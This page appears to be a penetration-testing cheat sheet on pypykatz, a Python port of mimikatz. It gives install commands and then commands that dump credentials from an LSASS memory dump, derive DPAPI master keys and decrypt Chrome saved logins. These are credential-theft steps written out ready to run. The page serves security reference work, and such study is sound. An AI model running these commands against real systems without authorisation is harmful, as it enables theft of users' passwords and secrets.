# pypykatz

<div class="row row-cols-lg-2"><div>

[pypykatz](https://github.com/skelsec/pypykatz) <small>(2.7k ⭐)</small> is a python port of [mimikatz](mimikatz.md) that works on any operating system including Linux.

You should use `pipx` to install it:

```ps
$ pipx install git+https://github.com/skelsec/pypykatz.git
$ pypykatz -h
```

The documentation is available [here](). Note down that it's separated between `Live commands`, and `Platform-independent commands`.
</div><div>

Extract credentials from [LSASS](/operating-systems/windows/security/index.md#dump-credentials-from-lsass-process) process dump.

```shell!
$ pypykatz lsa minidump lsass.dmp
```

Extract the [DPAPI](/operating-systems/windows/security/index.md#dump-credentials-protected-by-the-dpapi) master key.

```shell!
$ pypykatz dpapi prekey password S-A-B-C-D-E-F-G password -o ./prekey
$ pypykatz dpapi masterkey ./H-I-J-K-L ./prekey -o mkf
```

Extract chrome secrets using the DPAPI master key.

```shell!
$ pypykatz dpapi chrome ./mkf "./Local State" --logindata "./Default/Login Data"
```
</div></div>